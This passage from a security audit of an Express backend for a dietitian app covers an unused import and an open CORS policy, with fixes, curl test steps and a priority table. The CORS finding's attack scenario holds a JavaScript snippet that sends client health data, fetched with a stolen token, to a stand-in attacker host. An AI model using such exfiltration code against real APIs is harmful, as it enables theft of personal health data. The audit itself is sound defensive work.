// backend/src/middleware/auth.middleware.ts:2 (after)
import { getAuth } from '@clerk/express';
```

Additionally, consider enabling the `@typescript-eslint/no-unused-vars` rule in the project's ESLint configuration:

```json
// .eslintrc.json (or equivalent)
{
  "rules": {
    "@typescript-eslint/no-unused-vars": ["error", {
      "argsIgnorePattern": "^_",
      "varsIgnorePattern": "^_"
    }]
  }
}
```

### Testing Steps

1. **Verify the import is removed:**
   - Run `grep -n "clerkClient" backend/src/middleware/auth.middleware.ts`. Expect zero matches.

2. **Verify auth still works:**
   - Make any authenticated API request (e.g., `GET /api/v1/clients`).
   - Expect successful authentication. The `getAuth` function should work independently of `clerkClient`.

3. **TypeScript compiles cleanly:**
   - Run `npx tsc --noEmit` from the backend directory. Expect no errors.

4. **Enable and run linting:**
   - Add or enable the `no-unused-vars` rule.
   - Run `npx eslint backend/src/middleware/auth.middleware.ts`.
   - Expect no warnings for the updated file.

---

## 2.6 MEDIUM: No CORS Configuration Visible

**File:** `backend/src/app.ts` (line 13)
**Severity:** MEDIUM
**Category:** Cross-Origin Resource Sharing / Network Security

### The Problem

The Express application uses the `cors` middleware with no configuration, which defaults to allowing ALL origins:

```typescript
// backend/src/app.ts:13
app.use(cors());
```

The `cors()` function with no arguments sets the following response headers:

```
Access-Control-Allow-Origin: * (reflects the requesting origin)
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: (reflects the request headers)
```

This means any website on the internet can make authenticated cross-origin requests to this API from a user's browser.

The DietKaro architecture has:
- **Frontend (admin dashboard):** A Next.js app (likely running on `localhost:3000` in dev, and a specific domain in production)
- **Client app:** A React Native/Expo mobile app (makes direct API calls, not subject to browser CORS)
- **Backend API:** Express server (the CORS configuration in question)

### Why It's Dangerous

1. **Cross-Site Request Forgery (CSRF) via CORS:** With `Access-Control-Allow-Origin: *`, a malicious website can make API requests on behalf of a logged-in dietitian. If the dietitian visits `evil-site.com` while logged into DietKaro, the malicious site can:
   - Read client lists and personal health data
   - Modify diet plans
   - Delete clients
   - Access all API endpoints the dietitian has access to

2. **Data Exfiltration:** Since the permissive CORS policy allows reading responses (not just sending requests), an attacker can exfiltrate sensitive data silently. A standard CSRF attack can only trigger actions; a CORS misconfiguration also lets the attacker read the API responses.

3. **Credential Forwarding:** Although `Access-Control-Allow-Origin: *` does not allow `credentials: true` by default, the Clerk SDK uses Bearer tokens (not cookies), so the attack works differently: if the token is stored in `localStorage` and exfiltrated via XSS, CORS does not matter. However, if cookies are ever added, the wide-open CORS becomes directly exploitable.

### Attack Scenarios

**Scenario 1: Malicious website reads client data**
```html
<!-- evil-site.com/steal.html -->
<script>
// If the dietitian's JWT is in a cookie or the attacker has it from another vector:
fetch('https://dietkaro-api.example.com/api/v1/clients?page=1&pageSize=100', {
    headers: {
        'Authorization': 'Bearer ' + stolenToken
    }
})
.then(r => r.json())
.then(data => {
    // Exfiltrate all client names, emails, phones, health data
    fetch('https://evil-site.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

**Scenario 2: Social engineering + CORS**
- Attacker sends a dietitian a link: "Check out this new diet research."
- The link opens a page that silently queries the DietKaro API using the dietitian's session.
- Client health data is exfiltrated.

### The Fix

Configure CORS to allow only known origins.

```typescript
// backend/src/app.ts (updated)
import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import morgan from 'morgan';
import { clerkMiddleware } from '@clerk/express';
import { errorHandler, notFoundHandler } from './middleware/errorHandler';
import logger from './utils/logger';

const app = express();

// ---------------------
// CORS Configuration
// ---------------------
const ALLOWED_ORIGINS = (process.env.CORS_ALLOWED_ORIGINS || '')
    .split(',')
    .map(origin => origin.trim())
    .filter(Boolean);

// Fallback for development
if (ALLOWED_ORIGINS.length === 0 && process.env.NODE_ENV !== 'production') {
    ALLOWED_ORIGINS.push(
        'http://localhost:3000',   // Next.js frontend
        'http://localhost:3001',   // Alternate dev port
        'http://localhost:8081',   // Expo dev server
    );
    logger.warn('CORS: No CORS_ALLOWED_ORIGINS set, using development defaults');
}

if (ALLOWED_ORIGINS.length === 0 && process.env.NODE_ENV === 'production') {
    logger.error('CORS: CORS_ALLOWED_ORIGINS is not set in production! All cross-origin requests will be blocked.');
}

const corsOptions: cors.CorsOptions = {
    origin: (origin, callback) => {
        // Allow requests with no origin (mobile apps, curl, server-to-server)
        if (!origin) {
            return callback(null, true);
        }

        if (ALLOWED_ORIGINS.includes(origin)) {
            return callback(null, true);
        }

        logger.warn(`CORS: Blocked request from origin: ${origin}`);
        return callback(new Error(`Origin ${origin} not allowed by CORS`));
    },
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
    credentials: true,  // Allow cookies and auth headers
    maxAge: 86400,       // Cache preflight for 24 hours
};

app.use(cors(corsOptions));

// Middleware
app.use(express.json());
app.use(helmet());
app.use(morgan('dev'));

// ... rest of app.ts unchanged
```

Add the environment variable to your deployment configuration:

```bash
# .env.production
CORS_ALLOWED_ORIGINS=https://app.dietkaro.com,https://admin.dietkaro.com

# .env.development
CORS_ALLOWED_ORIGINS=http://localhost:3000,http://localhost:8081
```

### Testing Steps

1. **Allowed origin succeeds:**
   ```bash
   curl -X OPTIONS http://localhost:5000/api/v1/clients \
     -H "Origin: http://localhost:3000" \
     -H "Access-Control-Request-Method: GET" \
     -v
   # Expect: Access-Control-Allow-Origin: http://localhost:3000
   ```

2. **Disallowed origin is rejected:**
   ```bash
   curl -X OPTIONS http://localhost:5000/api/v1/clients \
     -H "Origin: https://evil-site.com" \
     -H "Access-Control-Request-Method: GET" \
     -v
   # Expect: No Access-Control-Allow-Origin header, or an error response
   ```

3. **No origin (mobile app / server-to-server) succeeds:**
   ```bash
   curl -X GET http://localhost:5000/api/v1/clients \
     -H "Authorization: Bearer <token>"
   # Expect: Normal response (no Origin header means no CORS enforcement)
   ```

4. **Production requires CORS_ALLOWED_ORIGINS:**
   - Set `NODE_ENV=production` and unset `CORS_ALLOWED_ORIGINS`.
   - Start the server. Verify the error log message appears.
   - Make a cross-origin request. Expect it to be blocked.

5. **Multiple origins work:**
   - Set `CORS_ALLOWED_ORIGINS=http://localhost:3000,http://localhost:3001`.
   - Test requests from both origins. Both should succeed.
   - Test from a third origin. Should be blocked.

6. **Preflight caching:**
   - Make an OPTIONS request and verify the `Access-Control-Max-Age: 86400` header is present.
   - This reduces preflight request overhead for the frontend.

---

## Summary Table

| ID  | Severity | Issue | Status | Effort |
|-----|----------|-------|--------|--------|
| 2.1 | HIGH | No input validation on meal operations | Open | Medium (add Zod schema + update service) |
| 2.2 | HIGH | 30-day token with no refresh/revocation | Open | High (new DB table + token rotation logic + client app changes) |
| 2.3 | HIGH | Broken WhatsApp links for null/invalid phones | Open | Low (add validation function + error handling) |
| 2.4 | MEDIUM | Math.random() for referral codes | Open | Low (swap to crypto.randomInt) |
| 2.5 | MEDIUM | Unused clerkClient import | Open | Trivial (remove one import) |
| 2.6 | MEDIUM | CORS allows all origins | Open | Low (configure cors middleware options) |

**Recommended Priority Order:**
1. **2.3** -- Quick fix, currently broken functionality sending health data to wrong recipients
2. **2.6** -- Quick fix, wide-open CORS in production is an immediate risk
3. **2.1** -- Medium effort, prevents 500 errors and hardens input handling
4. **2.4** -- Quick fix, swap one function call
5. **2.5** -- Trivial, remove one import
6. **2.2** -- Highest effort, requires client app changes, database migration, and new API endpoints; plan as a sprint item
